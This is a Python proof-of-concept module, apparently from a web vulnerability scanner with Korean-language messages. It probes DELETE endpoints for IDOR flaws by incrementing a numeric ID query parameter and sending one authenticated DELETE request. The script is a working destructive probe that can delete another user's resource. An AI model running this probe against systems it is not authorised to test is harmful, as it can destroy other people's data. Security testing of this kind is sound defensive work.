import argparse
import hashlib
import json
import re
import sys

import requests


POC_NAME = "idor_query_delete_resource"
REQUEST_TIMEOUT_SECONDS = 3
SAFE_METHODS = {"DELETE"}
MAX_PROBES = 1

IGNORE_KEYS = {
    "page",
    "size",
    "limit",
    "offset",
    "sort",
    "order",
    "year",
    "month",
    "day",
    "count",
    "total",
    "amount",
    "price",
    "quantity",
    "qty",
    "csrf",
    "csrf_token",
    "_csrf",
    "token",
    "access_token",
    "refresh_token",
}

ID_KEY_PATTERN = re.compile(
    r"(^id$|(^|[_\-.])(id|user_id|owner_id|account_id|member_id|post_id|"
    r"article_id|item_id|resource_id|order_id|invoice_id|tenant_id|org_id|"
    r"organization_id|team_id|project_id|document_id|file_id|profile_id)$|"
    r"(^|[_\-.])[a-z0-9]+_id$)",
    re.IGNORECASE,
)

DENIAL_SIGNATURES = (
    "access denied",
    "permission denied",
    "forbidden",
    "not authorized",
    "not authorised",
    "unauthorized",
    "unauthorised",
    "insufficient privilege",
    "insufficient permission",
    "권한 없음",
    "권한이 없습니다",
    "접근 거부",
)

APPLICATION_FAILURE_SIGNATURES = (
    "not found",
    "not_found",
    "no such",
    "does not exist",
    "invalid id",
    "invalid resource",
    "resource not found",
    "record not found",
    "already deleted",
    "존재하지",
    "찾을 수 없",
)


def fingerprint(response):
    content = response.content or b""

    return {
        "status_code": response.status_code,
        "length": len(content),
        "sha1": hashlib.sha1(content).hexdigest(),
        "content_type": response.headers.get("Content-Type", ""),
        "location": response.headers.get("Location", ""),
    }


def response_text_lower(response, limit=4000):
    return response.text[:limit].lower()


def has_text_signature(response, signatures):
    text_lower = response_text_lower(response)
    return any(signature in text_lower for signature in signatures)


def classify_response(response):
    status_code = response.status_code

    if status_code >= 500:
        return "server_error"

    if status_code in (401, 403):
        return "auth_block"

    if status_code in (301, 302, 303, 307, 308):
        return "redirect"

    if status_code == 404:
        return "not_found"

    if status_code == 405:
        return "method_not_allowed"

    if 400 <= status_code < 500:
        return "client_error"

    if 200 <= status_code < 300:
        if has_text_signature(response, DENIAL_SIGNATURES):
            return "denial_body"
        if has_text_signature(response, APPLICATION_FAILURE_SIGNATURES):
            return "application_failure"
        return "success"

    return "unknown"


def is_number(value):
    if value is None or isinstance(value, bool):
        return False

    value = str(value).strip()

    if value == "":
        return False

    return value.isdigit()


def normalize_key_for_matching(key):
    key = re.sub(r"([a-z0-9])([A-Z])", r"\1_\2", str(key))
    return key.lower()


def is_id_like_key(key):
    normalized = normalize_key_for_matching(key)
    return bool(ID_KEY_PATTERN.search(normalized))


def iter_candidate_params(query_params):
    id_like = []
    numeric_fallback = []

    for key, value in (query_params or {}).items():
        normalized = normalize_key_for_matching(key)

        if normalized in IGNORE_KEYS:
            continue

        if not is_number(value):
            continue

        candidate = {
            "key": key,
            "value": value,
            "reason": "id_like" if is_id_like_key(key) else "numeric_fallback",
        }

        if is_id_like_key(key):
            id_like.append(candidate)
        else:
            numeric_fallback.append(candidate)

    return id_like or numeric_fallback


def mutate_numeric_value(value):
    return str(int(str(value).strip()) + 1)


def make_headers(auth_headers):
    headers = {
        "User-Agent": "Scanner-033ca182-dcdd-406b-bcb5-816d726ca809",
    }
    headers.update(auth_headers or {})
    return headers


def request_once(method, url, query_params, auth_headers, auth_cookies):
    return requests.request(
        method=method,
        url=url,
        params=query_params or {},
        headers=make_headers(auth_headers),
        cookies=auth_cookies or {},
        timeout=REQUEST_TIMEOUT_SECONDS,
        allow_redirects=False,
    )


def build_raw_output(
    method,
    path,
    query_params,
    auth_headers,
    auth_cookies,
    candidates,
    probes=None,
    note="",
):
    return json.dumps(
        {
            "request": {
                "method": method,
                "path": path,
                "query_param_keys": sorted((query_params or {}).keys()),
                "auth_header_keys": sorted((auth_headers or {}).keys()),
                "auth_cookie_keys": sorted((auth_cookies or {}).keys()),
            },
            "candidate_params": candidates,
            "probes": probes or [],
            "note": note,
        },
        ensure_ascii=False,
    )


def make_result(status, description, evidence="", raw_output="", vulnerable=False):
    return {
        "poc_name": POC_NAME,
        "status": status,
        "description": description,
        "evidence": evidence,
        "raw_output": raw_output,
        "vulnerable": vulnerable,
    }


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--input", required=True)
    args = parser.parse_args()

    with open(args.input, "r", encoding="utf-8") as f:
        payload = json.load(f)

    base_url = payload["base_url"].rstrip("/")
    path = payload.get("path", "")
    method = payload.get("method", "DELETE").upper()
    query_params = payload.get("query_params", {}) or {}
    auth = payload.get("auth", {}) or {}
    auth_headers = auth.get("headers", {}) or {}
    auth_cookies = auth.get("cookies", {}) or {}

    url = f"{base_url}{path}"
    candidates = iter_candidate_params(query_params)

    print(f"[DEBUG] url={url}", file=sys.stderr)
    print(f"[DEBUG] method={method}", file=sys.stderr)
    print(f"[DEBUG] original_query_params={query_params}", file=sys.stderr)
    print(f"[DEBUG] candidate_params={candidates}", file=sys.stderr)
    print(f"[DEBUG] auth_header_count={len(auth_headers)}", file=sys.stderr)
    print(f"[DEBUG] auth_cookie_count={len(auth_cookies)}", file=sys.stderr)

    try:
        if method not in SAFE_METHODS:
            result = make_result(
                status="Skipped",
                description="DELETE 요청이 아니어서 query DELETE IDOR 테스트를 수행하지 않았습니다.",
                evidence=f"method={method}",
                raw_output=build_raw_output(
                    method=method,
                    path=path,
                    query_params=query_params,
                    auth_headers=auth_headers,
                    auth_cookies=auth_cookies,
                    candidates=candidates,
                ),
                vulnerable=False,
            )
            print(json.dumps(result, ensure_ascii=False))
            return

        if not query_params:
            result = make_result(
                status="Skipped",
                description="query_params가 없어 query DELETE IDOR 테스트를 수행할 수 없습니다.",
                evidence="missing query_params",
                raw_output=build_raw_output(
                    method=method,
                    path=path,
                    query_params=query_params,
                    auth_headers=auth_headers,
                    auth_cookies=auth_cookies,
                    candidates=[],
                ),
                vulnerable=False,
            )
            print(json.dumps(result, ensure_ascii=False))
            return

        if not auth_headers and not auth_cookies:
            result = make_result(
                status="Skipped",
                description="인증 포함 DELETE probe에 사용할 Cookie 또는 Authorization 값이 없어 검사를 건너뜁니다.",
                evidence="missing auth",
                raw_output=build_raw_output(
                    method=method,
                    path=path,
                    query_params=query_params,
                    auth_headers=auth_headers,
                    auth_cookies=auth_cookies,
                    candidates=candidates,
                ),
                vulnerable=False,
            )
            print(json.dumps(result, ensure_ascii=False))
            return

        if not candidates:
            result = make_result(
                status="Skipped",
                description="테스트할 숫자 query value를 찾지 못했습니다.",
                evidence="no numeric query value",
                raw_output=build_raw_output(
                    method=method,
                    path=path,
                    query_params=query_params,
                    auth_headers=auth_headers,
                    auth_cookies=auth_cookies,
                    candidates=[],
                ),
                vulnerable=False,
            )
            print(json.dumps(result, ensure_ascii=False))
            return

        probes = []
        vulnerable_found = False

        for candidate in candidates[:MAX_PROBES]:
            target_key = candidate["key"]
            original_value = candidate["value"]
            changed_value = mutate_numeric_value(original_value)
            test_params = query_params.copy()
            test_params[target_key] = changed_value

            print(f"[DEBUG] target_key={target_key}", file=sys.stderr)
            print(f"[DEBUG] original_value={original_value}", file=sys.stderr)
            print(f"[DEBUG] changed_value={changed_value}", file=sys.stderr)
            print(f"[DEBUG] test_params={test_params}", file=sys.stderr)

            response = request_once(
                method=method,
                url=url,
                query_params=test_params,
                auth_headers=auth_headers,
                auth_cookies=auth_cookies,
            )
            state = classify_response(response)
            success = state == "success"
            vulnerable_found = vulnerable_found or success

            probes.append(
                {
                    "target_key": target_key,
                    "candidate_reason": candidate["reason"],
                    "original_value": original_value,
                    "changed_value": changed_value,
                    "state": state,
                    "fingerprint": fingerprint(response),
                    "success": success,
                    "response_preview": response.text[:500],
                }
            )

        raw_output = build_raw_output(
            method=method,
            path=path,
            query_params=query_params,
            auth_headers=auth_headers,
            auth_cookies=auth_cookies,
            candidates=candidates,
            probes=probes,
            note="원본 ID 삭제 baseline은 부작용 방지를 위해 보내지 않고, 변경한 query ID에 대해서만 DELETE probe를 보냅니다.",
        )

        if vulnerable_found:
            result = make_result(
                status="Completed",
                description="숫자 query 값을 변경한 DELETE 요청이 성공 응답을 반환했습니다. 다른 사용자 리소스 삭제 가능성이 있습니다.",
                evidence="changed numeric query value returned successful DELETE response",
                raw_output=raw_output,
                vulnerable=True,
            )
        else:
            result = make_result(
                status="Completed",
                description="숫자 query 값을 변경한 DELETE 요청이 성공 응답으로 처리되지 않았습니다.",
                evidence="changed numeric query value did not return successful DELETE response",
                raw_output=raw_output,
                vulnerable=False,
            )

    except Exception as e:
        result = make_result(
            status="Error",
            description="PoC execution failed.",
            evidence=str(e),
            raw_output="",
            vulnerable=False,
        )

    print(json.dumps(result, ensure_ascii=False))


if __name__ == "__main__":
    main()
